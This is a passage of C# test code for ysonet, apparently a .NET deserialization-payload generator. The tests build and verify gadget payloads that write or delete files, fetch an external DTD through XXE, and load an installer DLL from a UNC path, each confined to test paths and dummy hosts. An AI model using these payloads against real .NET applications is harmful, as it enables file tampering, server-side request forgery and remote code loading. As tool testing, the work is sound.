                    AssertTrue((minified.ErrorMessage ?? "").Contains("cannot use --minify with NetDataContractSerializer"),
                        "the refusal names the combination: " + minified.ErrorMessage);
                    AssertTrue((minified.ErrorMessage ?? "").Contains("BinaryFormatter"),
                        "the refusal offers the formatters that do carry it: " + minified.ErrorMessage);
                }

                // Either way the un-minified NDCS payload must still deliver it intact, so
                // the refusal is about --minify and nothing else.
                AssertFileOpsWriteArrives(body, fixture, target, "NetDataContractSerializer", false, label);
            }
            finally { SafeDelete(fixture); SafeDelete(target); }
        }

        private static void AssertFileOpsWriteArrivesIntact(string body, string formatter, bool minify)
        {
            string fixture = TestArtifactPath("ysonet_fileops_binary_probe.txt");
            string target = FileOpsPath("zz_binary_probe.txt");
            SafeDelete(fixture);
            try
            {
                File.WriteAllText(fixture, body, new UTF8Encoding(false));
                AssertTrue(File.Exists(fixture), "the content fixture survived the write");
                AssertFileOpsWriteArrives(body, fixture, target, formatter, minify,
                    formatter + (minify ? " --minify" : "") + " content " + Preview(body));
            }
            finally { SafeDelete(fixture); SafeDelete(target); }
        }

        private static void AssertFileOpsWriteArrives(string body, string fixture, string target,
            string formatter, bool minify, string label)
        {
            SafeDelete(target);
            RunResult r = GenerateFileOps(1, target + ";" + fixture, formatter, null, minify);
            AssertTrue(r.Success, "the write payload generates (" + label + "): " + r.ErrorMessage);
            RunSTA(delegate { DeserializeAs(FileOpsDeserTag(formatter), Bytes(r.Raw)); });
            AssertTrue(File.Exists(target), "the payload wrote the target file (" + label + ")");
            AssertEqual(body, File.ReadAllText(target),
                "the delivered text is byte-for-byte what the operator supplied (" + label + ")");
            SafeDelete(target);
        }

        // A readable one-line form of a content fixture for an assertion message.
        private static string Preview(string value)
        {
            string s = (value ?? "").Replace("\r", "\\r").Replace("\n", "\\n");
            return "\"" + (s.Length <= 40 ? s : s.Substring(0, 40) + "...") + "\"";
        }

        // A target path is resolved by the DESERIALIZING process, not by ysonet. Proven with
        // a child ysonet.exe whose working directory the test controls, so the runner's own
        // process-wide current directory is never touched.
        private static void FileOperationsTargetPathsAreRelativeToTheTarget()
        {
            string exeDir = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
            string exe = Path.Combine(exeDir, "ysonet.exe");
            AssertTrue(File.Exists(exe), "ysonet.exe sits next to the test exe: " + exe);

            string workDir = TestArtifactPath("ysonet_fileops_workdir");
            SafeDeleteDir(workDir);
            Directory.CreateDirectory(workDir);
            try
            {
                const string relative = "zz_relative_target.txt";
                var psi = new System.Diagnostics.ProcessStartInfo(exe);
                psi.Arguments = "-g " + FileOpsGadget + " -f BinaryFormatter --variant 5 -c \""
                    + relative + "\" -t -o base64";
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = workDir;   // the only thing that decides where it lands

                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate { };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    if (!proc.WaitForExit(60000)) { try { proc.Kill(); } catch { } }
                }

                AssertTrue(File.Exists(Path.Combine(workDir, relative)),
                    "the relative target path resolved against the DESERIALIZING process's working directory");
                AssertTrue(!File.Exists(Path.Combine(exeDir, relative)),
                    "nothing was written next to ysonet.exe");
            }
            finally { SafeDeleteDir(workDir); }
        }

        // The interactive editor must offer all five operation labels plus the root
        // container as a separate plain option, start on the write default, and emit the
        // NUMBER on the command line rather than the human label.
        private static void EditorExposesTheFileOperationVariants()
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            var fields = ed.BuildFieldsForTest(FileOpsGadget);

            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null, "the variant field is offered");
            var declared = Gadget(FileOpsGadget).Variants();
            AssertEqual(5, declared.Count, "five operations are declared");
            AssertTrue(variant.Choices != null && variant.Choices.Count == 5,
                "all five operation labels are offered");
            for (int i = 0; i < declared.Count; i++)
                AssertEqual(declared[i].Label, variant.Choices[i], "label " + (i + 1) + " is in variant order");
            AssertEqual(declared[0].Label, variant.Value, "the editor starts on the write default");

            EditableField container = FindEditable(fields,
                TypeConfuseDelegateGenerator.RootContainerOptionName);
            AssertTrue(container != null && !container.Hidden,
                "the root container is a plain option, offered for every operation");

            FindEditable(fields, "command").Value = FileOpsPath("zz_a.txt") + ";" + FileOpsPath("aa_b.txt");
            string flag = VariantFlagFor(Gadget(FileOpsGadget));

            variant.Value = declared[4].Label;   // the empty-file operation
            string line = ed.GadgetCommandLineForTest();
            AssertTrue(line.Contains(flag + " 5"), "the echoed command line carries the number: " + line);
            AssertTrue(!line.Contains(declared[4].Label),
                "the human label never leaks into the command line: " + line);
        }

        // ---- TempFileCollection (deferred target file delete) -------------------
        //
        // System.CodeDom.Compiler.TempFileCollection is field-serialized and its
        // finalizer/Dispose calls File.Delete over a private Hashtable of paths. The gadget
        // emits it through an ISerializable marshal and never builds a live one, so the tests
        // below check the WIRE shape and the parsing here; the real deletion is proven in the
        // FULL tier by FireTempFileCollectionDeletes.
        //
        // Every path any test here puts into a payload is either nonexistent or inside the
        // test's own artifact directory, and every deserialize suppresses the finalizer it
        // just armed. Nothing outside the test tree can ever be named.

        private const string TempFilesGadget = "TempFileCollection";

        private static readonly string[] TempFilesFormatters =
        {
            "BinaryFormatter", "SoapFormatter", "LosFormatter",
            "NetDataContractSerializer", "DataContractSerializer",
        };

        // The XML formatters among them: the only ones whose --minify pass can rewrite a path.
        private static readonly string[] TempFilesXmlFormatters =
            { "SoapFormatter", "NetDataContractSerializer", "DataContractSerializer" };

        // The deserializer tag for each of them (same tags DeserializeAs uses).
        private static string TempFilesDeserTag(string formatter)
        {
            switch (formatter)
            {
                case "BinaryFormatter": return "bf";
                case "SoapFormatter": return "soap";
                case "LosFormatter": return "los";
                case "NetDataContractSerializer": return "ndc";
                case "DataContractSerializer": return "dcs";
                default: throw new Exception("no deserializer tag for " + formatter);
            }
        }

        private static RunResult GenerateTempFiles(string formatter, bool minify,
            bool test, params string[] paths)
        {
            AssertTrue(paths != null && paths.Length > 0, "the test supplied at least one path");
            InputArgs ia = new InputArgs();
            ia.Cmd = paths[0];
            ia.Test = test;
            ia.Minify = minify;
            var extra = new List<string>();
            for (int i = 1; i < paths.Length; i++)
            {
                extra.Add("--" + TempFileCollectionGenerator.ExtraFileOptionName);
                extra.Add(paths[i]);
            }
            ia.ExtraArguments = extra;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = TempFilesGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        private static RunResult GenerateTempFiles(params string[] paths)
        {
            return GenerateTempFiles("BinaryFormatter", false, false, paths);
        }

        // Deserialize a TempFileCollection payload and hand the real object to the caller,
        // ALWAYS suppressing its finalizer afterwards. That is what makes it safe to
        // reconstruct the type inside the test runner: the object is inspected and then
        // disarmed, so nothing is left on the finalizer queue to delete a path later.
        private static void WithDeserializedTempFileCollection(string formatter, object raw,
            Action<object> inspect)
        {
            object obj = null;
            try
            {
                obj = DeserializeTempFileCollection(formatter, raw);
                inspect(obj);
            }
            finally
            {
                if (obj != null) GC.SuppressFinalize(obj);
            }
        }

        // The path -> keepFile map the target's Delete() reads, pulled off a deserialized
        // instance by reflection. Ordinal keys, because the framework's own lookup uses the
        // exact string it copied out of the table.
        private static Dictionary<string, object> TempFilesTableOf(object collection)
        {
            var field = collection.GetType().GetField("files",
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            AssertTrue(field != null, "TempFileCollection still has its private 'files' field");
            var table = field.GetValue(collection) as System.Collections.Hashtable;
            AssertTrue(table != null, "the 'files' field carries a Hashtable");
            var map = new Dictionary<string, object>(StringComparer.Ordinal);
            foreach (System.Collections.DictionaryEntry e in table)
                map[(string)e.Key] = e.Value;
            return map;
        }

        private static object TempFilesFieldOf(object collection, string name)
        {
            var field = collection.GetType().GetField(name,
                System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            AssertTrue(field != null, "TempFileCollection still has its private '" + name + "' field");
            return field.GetValue(collection);
        }

        // Every advertised formatter, raw and minified, must rebuild the REAL framework type
        // with exactly the four fields the target's Delete() path reads. A wire shape that
        // merely generates proves nothing: if a field name drifts or a value arrives as true,
        // the payload silently deletes nothing.
        private static void TempFileCollectionCarriesTheRealTypeAndFields()
        {
            // Deliberately nonexistent, and named so a stray delete would be obvious.
            string first = TestArtifactPath("ysonet_tfc_never_exists_1.txt");
            string second = TestArtifactPath("ysonet_tfc_never_exists_2.txt");
            AssertTrue(!File.Exists(first) && !File.Exists(second),
                "the round-trip paths do not exist, so even a leaked finalizer has nothing to delete");

            Type real = Type.GetType(TempFileCollectionGenerator.TempFileCollectionTypeName, true);

            foreach (string formatter in TempFilesFormatters)
            {
                foreach (bool minify in new[] { false, true })
                {
                    string label = formatter + (minify ? " --minify" : "");
                    RunResult r = GenerateTempFiles(formatter, minify, false, first, second);
                    AssertTrue(r.Success, label + " generates: " + r.ErrorMessage);

                    WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
                    {
                        AssertTrue(obj != null, label + " deserializes to an object");
                        AssertEqual(real, obj.GetType(),
                            label + " rebuilds the real System.CodeDom.Compiler.TempFileCollection");

                        AssertTrue(TempFilesFieldOf(obj, "basePath") == null, label + ": basePath is null");
                        AssertTrue(TempFilesFieldOf(obj, "tempDir") == null, label + ": tempDir is null");
                        AssertEqual(false, TempFilesFieldOf(obj, "keepFiles"), label + ": keepFiles is false");

                        var table = TempFilesTableOf(obj);
                        AssertEqual(2, table.Count, label + ": both paths arrived");
                        foreach (string path in new[] { first, second })
                        {
                            AssertTrue(table.ContainsKey(path), label + ": the path arrived verbatim (" + path + ")");
                            AssertEqual(false, table[path],
                                label + ": the per-file keepFile flag is false, so Delete() removes it");
                        }
                    });
                }
            }
        }

        // -c plus every repeated --extrafile, in order, with case-insensitive duplicates
        // collapsed and empty values refused. Also: no path I/O at generation time - a path
        // that happens to EXIST on this machine is still carried as the path, never read.
        private static void TempFileCollectionOptionParsing()
        {
            // Repeatable option, order preserved.
            RunResult many = GenerateTempFiles(@"C:\ysonet\a.txt", @"C:\ysonet\b.txt", @"C:\ysonet\c.txt");
            AssertTrue(many.Success, "three paths generate: " + many.ErrorMessage);
            WithDeserializedTempFileCollection("BinaryFormatter", many.Raw, delegate (object obj)
            {
                var table = TempFilesTableOf(obj);
                AssertEqual(3, table.Count, "-c plus two --extrafile values give three entries");
                foreach (string p in new[] { @"C:\ysonet\a.txt", @"C:\ysonet\b.txt", @"C:\ysonet\c.txt" })
                    AssertTrue(table.ContainsKey(p), "entry present: " + p);
            });

            // Case-insensitive duplicates collapse to one entry. A Hashtable cannot hold two
            // equal keys, and the real AddFile throws on a duplicate, so collapsing is the
            // only reading of "delete it twice" that makes sense.
            RunResult dupes = GenerateTempFiles(@"C:\ysonet\Dup.txt", @"C:\YSONET\dup.TXT", @"C:\ysonet\other.txt");
            AssertTrue(dupes.Success, "a case-different duplicate is accepted: " + dupes.ErrorMessage);
            WithDeserializedTempFileCollection("BinaryFormatter", dupes.Raw, delegate (object obj)
            {
                var table = TempFilesTableOf(obj);
                AssertEqual(2, table.Count, "the case-different duplicate collapsed into one entry");
                AssertTrue(table.ContainsKey(@"C:\ysonet\Dup.txt"),
                    "the FIRST spelling is the one that is kept");
                AssertTrue(table.ContainsKey(@"C:\ysonet\other.txt"), "the distinct path survived");
            });

            // An exact duplicate is equally harmless.
            RunResult exact = GenerateTempFiles(@"C:\ysonet\same.txt", @"C:\ysonet\same.txt");
            AssertTrue(exact.Success, "an exact duplicate is accepted: " + exact.ErrorMessage);
            WithDeserializedTempFileCollection("BinaryFormatter", exact.Raw, delegate (object obj)
            {
                AssertEqual(1, TempFilesTableOf(obj).Count, "an exact duplicate collapsed too");
            });

            // Empty / whitespace-only inputs are refused, not silently dropped.
            foreach (string bad in new[] { "", " ", "\t" })
            {
                RunResult noCmd = GenerateTempFiles("BinaryFormatter", false, false, bad);
                AssertTrue(!noCmd.Success, "an empty -c is refused (" + Preview(bad) + ")");
                AssertTrue((noCmd.ErrorMessage ?? "").Contains("-c"),
                    "the refusal names -c: " + noCmd.ErrorMessage);

                RunResult badExtra = GenerateTempFiles("BinaryFormatter", false, false, @"C:\ysonet\a.txt", bad);
                AssertTrue(!badExtra.Success, "an empty --extrafile is refused (" + Preview(bad) + ")");
                AssertTrue((badExtra.ErrorMessage ?? "").Contains(
                    TempFileCollectionGenerator.ExtraFileOptionName),
                    "the refusal names the option: " + badExtra.ErrorMessage);
            }

            // Escaping is the serializer's job, not a hand-built template's: a path full of
            // XML and JSON metacharacters must survive every advertised formatter unchanged.
            const string nasty = @"C:\ysonet\<a>&""'quote--;\x.txt";
            foreach (string formatter in TempFilesFormatters)
            {
                RunResult r = GenerateTempFiles(formatter, false, false, nasty);
                AssertTrue(r.Success, formatter + " generates a metacharacter path: " + r.ErrorMessage);
                WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
                {
                    AssertTrue(TempFilesTableOf(obj).ContainsKey(nasty),
                        formatter + " carried the metacharacter path verbatim");
                });
            }

            // No path I/O here: a file that EXISTS on this machine is still just a path. (The
            // shell-command gadgets read -c from a file when one exists; this one must not.)
            string existing = WriteTestArtifact("ysonet_tfc_existing_input.txt", "this text must never be read");
            try
            {
                RunResult r = GenerateTempFiles(existing);
                AssertTrue(r.Success, "an existing local path generates: " + r.ErrorMessage);
                WithDeserializedTempFileCollection("BinaryFormatter", r.Raw, delegate (object obj)
                {
                    var table = TempFilesTableOf(obj);
                    AssertEqual(1, table.Count, "one entry");
                    AssertTrue(table.ContainsKey(existing),
                        "an existing local path is carried as the PATH, not replaced by its contents");
                });
                AssertTrue(File.Exists(existing), "generation did not delete or move the local file");
                AssertEqual("this text must never be read", File.ReadAllText(existing),
                    "generation did not touch the local file's contents");
            }
            finally { SafeDelete(existing); }
        }

        // The interactive info panel only renders BodyRows lines, so a long
        // AdditionalInfo() silently pushes "Formatters:", "Command input:" and the category
        // summary off the visible area with no error anywhere. The shared canary
        // (ModuleInfoPanelShowsFacts) only guards the FIRST gadget alphabetically, so this
        // gadget checks its own panel - its AdditionalInfo has real preconditions to state
        // and is the kind of text that grows.
        private static void TempFileCollectionInfoPanelStillShowsItsFacts()
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            // A pessimistically NARROW info column: the panel is one of four columns, so a
            // realistic terminal gives it more room than this.
            string[] lines = ed.ModuleInfoLinesForTest(TempFilesGadget, 34);
            int visible = ModuleEditor.BodyRowsForTest;
            AssertTrue(lines.Length > 0, "the info panel renders for " + TempFilesGadget);

            // The panel uses the COMPACT category form, so the summary is one
            // "Categories: ..." line rather than the detailed per-axis block.
            foreach (string fact in new[] { "Formatters:", "Command input:", "Categories" })
            {
                int at = -1;
                for (int i = 0; i < lines.Length; i++)
                    // The category summary lines carry their own indentation.
                    if (lines[i].TrimStart().StartsWith(fact, StringComparison.Ordinal)) { at = i; break; }
                AssertTrue(at >= 0, "the panel states " + fact);
                AssertTrue(at < visible, fact + " is still on screen (row " + at + " of "
                    + visible + " visible; shorten AdditionalInfo() and move the detail into "
                    + "the option help)");
            }

            // The repeatable extra-path option must reach the editor too, so the gadget is
            // fully usable from the interactive build and not only from the command line.
            EditableField extra = FindEditable(ed.BuildFieldsForTest(TempFilesGadget),
                TempFileCollectionGenerator.ExtraFileOptionName);
            AssertTrue(extra != null && !extra.Hidden,
                "the editor offers the " + TempFileCollectionGenerator.ExtraFileOptionName + " setting");
            AssertTrue(!string.IsNullOrEmpty(extra.Help),
                "the extra-path setting carries its help text into the editor");
        }

        // A UNC path and a relative path both reach the target verbatim. Nothing is
        // canonicalized, rooted against ysonet's working directory, or expanded here - which
        // is the whole difference between a target path and a local file path.
        // ---- DataViewManagerXxe ------------------------------------------------

        private static readonly string[] DvmXxeFormatters =
        {
            "Xaml", "JavaScriptSerializer", "FastJson", "SharpSerializerXml", "SharpSerializerBinary"
        };

        private const string DvmXxeUrl = "http://127.0.0.1:1/ysonet-test.dtd";

        private static RunResult GenerateDvmXxe(string formatter, bool minify, string url)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = url;
            ia.Minify = minify;
            ia.Test = false;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "DataViewManagerXxe",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        private static string DvmXxePayloadText(object raw)
        {
            string text = raw as string;
            if (text != null) return text;
            byte[] bytes = raw as byte[];
            // The binary formatter's stream still carries the XML and the type name as
            // plain UTF-8 string records, so a text search is valid evidence there too.
            return bytes == null ? null : new UTF8Encoding(false).GetString(bytes);
        }

        // The integrity check: every advertised formatter must actually name the
        // DataViewManager carrier, target the DataViewSettingCollectionString setter, and
        // carry a DOCTYPE whose external parameter entity points at the operator's URL.
        private static void DataViewManagerXxeCarriesTheRealCarrierAndDoctype()
        {
            foreach (string formatter in DvmXxeFormatters)
            {
                RunResult r = GenerateDvmXxe(formatter, false, DvmXxeUrl);
                AssertTrue(r.Success, formatter + " generates: " + r.ErrorMessage);

                string text = DvmXxePayloadText(r.Raw);
                AssertTrue(text != null, formatter + ": payload is text or bytes");

                // XAML names the carrier as an element plus a clr-namespace; every other
                // formatter carries the assembly-qualified name.
                if (formatter == "Xaml")
                {
                    AssertTrue(text.IndexOf("<DataViewManager ", StringComparison.Ordinal) >= 0
                            && text.IndexOf("clr-namespace:System.Data;assembly=System.Data", StringComparison.Ordinal) >= 0,
                        formatter + ": names the DataViewManager carrier");
                }
                else
                {
                    AssertTrue(text.IndexOf("System.Data.DataViewManager", StringComparison.Ordinal) >= 0,
                        formatter + ": names the DataViewManager carrier");
                }
                AssertTrue(text.IndexOf("DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
                    formatter + ": targets the DataViewSettingCollectionString setter");

                // The inner XML is escaped for the outer syntax, so compare against the
                // decoded form the target will hand to XmlTextReader.
                string decoded = DecodeForFormatter(formatter, text);
                AssertTrue(decoded.IndexOf("<!DOCTYPE DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
                    formatter + ": carries a DOCTYPE using the root name the setter expects");
                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DvmXxeUrl + "\">", StringComparison.Ordinal) >= 0,
                    formatter + ": declares the external parameter entity at the operator URL");
                AssertTrue(decoded.IndexOf("%remote;", StringComparison.Ordinal) >= 0,
                    formatter + ": references the parameter entity, which is what forces the fetch");
            }
        }

        // Undo only the escaping the payload template applied, so the assertions above can
        // look at the XML the setter will really parse.
        private static string DecodeForFormatter(string formatter, string payload)
        {
            if (formatter == "Xaml" || formatter == "SharpSerializerXml")
                return payload.Replace("&#x22;", "\"").Replace("&quot;", "\"")
                              .Replace("&lt;", "<").Replace("&gt;", ">").Replace("&amp;", "&");
            if (formatter == "JavaScriptSerializer" || formatter == "FastJson")
                return payload.Replace("\\\"", "\"").Replace("\\\\", "\\");
            return payload; // SharpSerializerBinary stores the string verbatim
        }

        private static void DataViewManagerXxeValidatesTheDtdUrl()
        {
            // Rejected: nothing to fetch, or a character that would break out of (or
            // corrupt) the quoted DTD external identifier.
            foreach (string bad in new[]
            {
                null,
                "",
                "   ",
                "http://127.0.0.1/a\"b.dtd",      // ends the SystemLiteral
                "http://127.0.0.1/a<b.dtd",
                "http://127.0.0.1/a>b.dtd",
                "http://127.0.0.1/a\\b.dtd",
                "http://127.0.0.1/a b.dtd",       // whitespace
                "http://127.0.0.1/a\tb.dtd",
                "http://127.0.0.1/a\nb.dtd",
                "/relative/x.dtd",                // not absolute
                "127.0.0.1/x.dtd",
                "file:///C:/windows/win.ini",     // not a fetch this gadget claims
                "ftp://127.0.0.1/x.dtd",
                "jar:http://127.0.0.1/x.dtd",
            })
            {
                string captured = bad;
                AssertThrows(delegate { DataViewManagerXxeGenerator.ValidateDtdUrl(captured); },
                    "rejects DTD URL '" + (captured ?? "<null>") + "'");
            }

            // Accepted: '&' and '%' are literal inside a SystemLiteral (it recognises
            // neither entity nor parameter-entity references), so an ordinary query string
            // and percent-encoding must survive.
            const string query = "https://example.test:8443/a%20b.dtd?x=1&y=2";
            AssertEqual(query, DataViewManagerXxeGenerator.ValidateDtdUrl(query),
                "keeps a percent-encoded query-string URL verbatim");
            AssertEqual(DvmXxeUrl, DataViewManagerXxeGenerator.ValidateDtdUrl("  " + DvmXxeUrl + "  "),
                "trims surrounding whitespace");

            // And it must survive generation into a real payload.
            RunResult r = GenerateDvmXxe("Xaml", false, query);
            AssertTrue(r.Success, "generates with a query-string URL: " + r.ErrorMessage);
            string decoded = DecodeForFormatter("Xaml", DvmXxePayloadText(r.Raw));
            AssertTrue(decoded.IndexOf("SYSTEM \"" + query + "\"", StringComparison.Ordinal) >= 0,
                "the query-string URL reaches the DTD external identifier unchanged");
        }

        // --minify rewrites XML and JSON payloads. It must not break the DOCTYPE, the
        // parameter entity, or the URL, because those are the payload. Verified, not
        // predicted (see the minification note in .claude/memory/gadgets.md).
        private static void DataViewManagerXxeMinifyKeepsTheDoctype()
        {
            foreach (string formatter in DvmXxeFormatters)
            {
                RunResult r = GenerateDvmXxe(formatter, true, DvmXxeUrl);
                AssertTrue(r.Success, formatter + " generates minified: " + r.ErrorMessage);

                string decoded = DecodeForFormatter(formatter, DvmXxePayloadText(r.Raw));
                AssertTrue(decoded.IndexOf("<!DOCTYPE DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the DOCTYPE survives");
                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DvmXxeUrl + "\">", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the parameter entity and URL survive intact");
                AssertTrue(decoded.IndexOf("%remote;", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the parameter entity reference survives");
            }
        }

        private static void DataViewManagerXxeDeclaresUrlInputAndNetworkKind()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance("DataViewManagerXxe");
            AssertTrue(g != null, "DataViewManagerXxe is discoverable in the registry");
            AssertEqual(CommandInputType.Url, g.CommandInput(),
                "-c is a URL, so the editor and help describe it as one");

            AssertTrue(g.AdditionalInfo().IndexOf("4.5.2", StringComparison.Ordinal) >= 0,
                "AdditionalInfo names the pre-4.5.2 resolver condition that actually gates it");

            List<GadgetCapability> caps = GadgetFacetReader.Expand(g);
            AssertEqual(1, caps.Count, "no variants, so exactly one capability unit");
            GadgetCapability cap = caps[0];

            AssertTrue(cap.Kinds.Contains(PayloadKind.Network),
                "declares the network kind: a fetched DTD is SSRF evidence");
            AssertTrue(!cap.Kinds.Contains(PayloadKind.InformationDisclosure),
                "does NOT claim information disclosure: the setter never returns entity text");
            AssertTrue(cap.Requirements.Contains(GadgetRequirement.BuiltIn)
                    && cap.Requirements.Contains(GadgetRequirement.NetFramework),
                "needs only built-in .NET Framework types");

            // The gate is a target-framework/config decision, not a CLR build, so the
            // version axis stays unspecified and AdditionalInfo carries the real condition.
            AssertEqual(1, cap.Versions.Count, "declares one value on the version axis");
            AssertTrue(cap.Versions.Contains(RuntimeVersion.Unspecified),
                "leaves the runtime version axis unspecified");

            AssertTrue(cap.Inputs.Contains(PayloadInput.RemoteUrl),
                "the derived accepted input is remote-url");
        }

        // Every advertised formatter sets the property BY NAME. The excluded ones are
        // excluded for one of two structural reasons, and both are worth locking so a
        // later "let's add Json.NET" is caught here rather than shipped as a dead cell.
        private static void DataViewManagerXxeAdvertisesOnlySetterFormatters()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance("DataViewManagerXxe");
            List<string> advertised = g.SupportedFormatters();

            foreach (string expected in DvmXxeFormatters)
                AssertTrue(advertised.Contains(expected), "advertises " + expected);
            AssertEqual(DvmXxeFormatters.Length, advertised.Count,
                "advertises exactly the proven setter-calling formatters");

            // Contract-inferring serializers see DataViewManager's IList/IEnumerable and
            // build a COLLECTION contract, so the property setter is never called.
            // Field-based serializers never call a setter at all, and DataViewManager is
            // not [Serializable] either.
            foreach (string impossible in new[]
            {
                "Json.NET", "YamlDotNet", "DataContractSerializer", "NetDataContractSerializer",
                "XmlSerializer", "DataContractJsonSerializer", "MessagePackTypeless",
                "MessagePackTypelessLz4", "BinaryFormatter", "SoapFormatter", "LosFormatter",
                "FsPickler",
            })
            {
                AssertTrue(!advertised.Contains(impossible),
                    impossible + " cannot call the setter, so it must not be advertised");
                AssertTrue(!g.IsSupported(impossible), impossible + " is rejected by IsSupported");
            }

            // DataViewManager really does implement the collection interface that rules the
            // first group out - the reason, not just the outcome.
            Type carrier = Type.GetType(
                "System.Data.DataViewManager, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
            AssertTrue(carrier != null, "the DataViewManager carrier type resolves");
            AssertTrue(typeof(System.Collections.IList).IsAssignableFrom(carrier),
                "DataViewManager implements IList, which is why contract inference builds a collection");
            AssertTrue(!carrier.IsSerializable,
                "DataViewManager is not [Serializable], which rules out the runtime formatters");
        }

        // ---- AssemblyInstallerLoad ---------------------------------------------

        private const string AiGadget = "AssemblyInstallerLoad";

        // Every formatter the gadget advertises, in the same order, without the "(N)"
        // variant annotation the catalog carries.
        private static readonly string[] AiFormatters =
        {
            "Json.NET", "Xaml", "FastJson", "JavaScriptSerializer", "YamlDotNet",
            "SharpSerializerBinary", "SharpSerializerXml",
            "MessagePackTypeless", "MessagePackTypelessLz4",
        };

        // The two formatters that can also build the three list carriers, because both can
        // add to a read-only Items collection instead of assigning it.
        private static readonly string[] AiMultiCarrierFormatters = { "Json.NET", "Xaml" };

        private static readonly string[] AiCarrierNames =
        {
            "", "PropertyGrid", "ComboBox", "ListBox", "CheckedListBox"
        };

        // A local path that is never opened: the gadget treats -c as TARGET data.
        private const string AiLocalDll = @"C:\programdata\ysonet-test\installer.dll";
        private const string AiUncDll = @"\\ysonet-nonexistent-host\share\installer.dll";

        private static RunResult GenerateAssemblyInstaller(string formatter, int variant, int getter,
            bool minify, string path)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = path;
            ia.Minify = minify;
            ia.Test = false;
            ia.ExtraArguments = new List<string>
            {
                "--variant", variant.ToString(), "--getter", getter.ToString()
            };
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = AiGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The payload as searchable text. The two binary outputs still carry the type names
        // and the path as plain UTF-8 records, so a text search is valid evidence there too.
        private static string AiPayloadText(object raw)
        {
            string text = raw as string;
            if (text != null) return text;
            byte[] bytes = raw as byte[];
            return bytes == null ? null : new UTF8Encoding(false).GetString(bytes);
        }

        // The integrity check: every advertised formatter, variant and carrier must really
        // name the AssemblyInstaller carrier, set Path, and reach the getter that runs the
        // installers. Generation returning bytes proves none of that on its own.
        private static void AssemblyInstallerLoadCarriesTheRealChain()
        {
            foreach (string formatter in AiFormatters)
            {
                for (int variant = 1; variant <= 2; variant++)
                {
                    string path = variant == 2 ? AiUncDll : AiLocalDll;
                    for (int m = 0; m < 2; m++)
                    {
                        bool minify = m == 1;
                        string cell = formatter + " v" + variant + (minify ? " --minify" : "");

                        RunResult r = GenerateAssemblyInstaller(formatter, variant, 1, minify, path);
                        AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);

                        string text = AiPayloadText(r.Raw);
                        AssertTrue(text != null, cell + ": payload is text or bytes");

                        // The Lz4 flavour is COMPRESSED, so no name or path is readable in
                        // the bytes. Its uncompressed twin above carries the identical graph
                        // and is asserted in full; here only the shape can be checked, and
                        // the runtime proof is its cell in the FULL execution matrix.
                        if (formatter == "MessagePackTypelessLz4")
                        {
                            AssertTrue(((byte[])r.Raw).Length > 0, cell + ": produces a non-empty payload");
                            continue;
                        }

                        // XAML names the type as an element plus a clr-namespace; every
                        // other formatter carries the assembly-qualified name. The namespace
                        // PREFIX is not asserted: --minify renames it (ci -> a), which is
                        // the minifier doing its job.
                        if (formatter == "Xaml")
                            AssertTrue(text.IndexOf(":AssemblyInstaller ", StringComparison.Ordinal) >= 0
                                    && text.IndexOf("clr-namespace:System.Configuration.Install;assembly=System.Configuration.Install", StringComparison.Ordinal) >= 0,
                                cell + ": names the AssemblyInstaller carrier");
                        else
                            AssertTrue(text.IndexOf("System.Configuration.Install.AssemblyInstaller", StringComparison.Ordinal) >= 0,
                                cell + ": names the AssemblyInstaller carrier");

                        AssertTrue(text.IndexOf("System.Windows.Forms.PropertyGrid", StringComparison.Ordinal) >= 0
                                || text.IndexOf("<PropertyGrid ", StringComparison.Ordinal) >= 0,
                            cell + ": names the PropertyGrid getter carrier");
                        AssertTrue(text.IndexOf("SelectedObject", StringComparison.Ordinal) >= 0,
                            cell + ": assigns the PropertyGrid selection, which is what reads the getter");
                        AssertTrue(text.IndexOf("Path", StringComparison.Ordinal) >= 0,
                            cell + ": sets the Path property, whose setter calls Assembly.LoadFrom");

                        // A surrogate name in the emitted bytes would mean the type swap
                        // silently failed: the payload still generates and is still valid,
                        // but no target could resolve it.
                        AssertTrue(text.IndexOf("Surrogate", StringComparison.Ordinal) < 0,
                            cell + ": leaks no ysonet surrogate type name");

                        // The operator's path must survive the template and the minifier
                        // exactly, or the target loads a different file.
                        AssertTrue(AiDecode(formatter, text).IndexOf(path, StringComparison.Ordinal) >= 0,
                            cell + ": carries the DLL path verbatim");
                    }
                }
            }

            // The three list carriers, on the two formatters that can build them.
            foreach (string formatter in AiMultiCarrierFormatters)
            {
                for (int getter = 2; getter <= 4; getter++)
                {
                    for (int m = 0; m < 2; m++)
                    {
                        bool minify = m == 1;
